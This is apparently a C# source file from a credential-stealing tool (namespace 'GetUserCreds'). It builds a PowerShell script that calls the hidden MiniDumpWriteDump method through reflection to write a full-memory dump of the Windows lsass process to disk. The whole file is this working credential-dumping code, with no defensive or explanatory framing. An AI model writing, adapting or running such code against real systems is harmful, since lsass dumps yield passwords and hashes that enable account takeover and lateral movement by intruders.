using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace GetUserCreds
{
    internal class PShell
    {
        private static string getPS(string location){
         string ps  = "$Process = Get-Process(\"lsass\")" + Environment.NewLine +
        "$DumpFilePath = \""+ location + "\"" + Environment.NewLine +
        "$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')" + Environment.NewLine +
        "$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')" + Environment.NewLine +
        "$Flags = [Reflection.BindingFlags] 'NonPublic, Static'" + Environment.NewLine +
        "$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)" + Environment.NewLine +
        "$MiniDumpWithFullMemory = [UInt32] 2" + Environment.NewLine +
        "$ProcessId = $Process.Id" + Environment.NewLine +
        "$ProcessName = $Process.Name" + Environment.NewLine +
        "$ProcessHandle = $Process.Handle" + Environment.NewLine +
        "$ProcessFileName = \"$($ProcessName)_$($ProcessId).dmp\"" + Environment.NewLine +
        "$ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName" + Environment.NewLine +
        "$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)" + Environment.NewLine +
        "$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle," + Environment.NewLine +
        "                                             $ProcessId," + Environment.NewLine +
        "                                             $FileStream.SafeFileHandle," + Environment.NewLine +
        "                                             $MiniDumpWithFullMemory," + Environment.NewLine +
        "                                             [IntPtr]::Zero," + Environment.NewLine +
        "                                             [IntPtr]::Zero," + Environment.NewLine +
        "                                             [IntPtr]::Zero))" + Environment.NewLine +
        "                                                     $FileStream.Close()" + Environment.NewLine +
        "if (-not $Result)" + Environment.NewLine +
        "{" + Environment.NewLine +
        "    $Exception = New-Object ComponentModel.Win32Exception" + Environment.NewLine +
        "    $ExceptionMessage = \"$($Exception.Message) ($($ProcessName):$($ProcessId))\"" + Environment.NewLine +
        "    Remove-Item $ProcessDumpPath -ErrorAction SilentlyContinue" + Environment.NewLine +
        "    throw $ExceptionMessage" + Environment.NewLine +
        "}" + Environment.NewLine +
        "else" + Environment.NewLine +
        "{" + Environment.NewLine +
        "    Get-ChildItem $ProcessDumpPath" + Environment.NewLine +
        "}" + Environment.NewLine;
        return ps;
    }
        internal static string getMyPwShellString(string location)
        {
            return getPS(location);
        }

    }
}
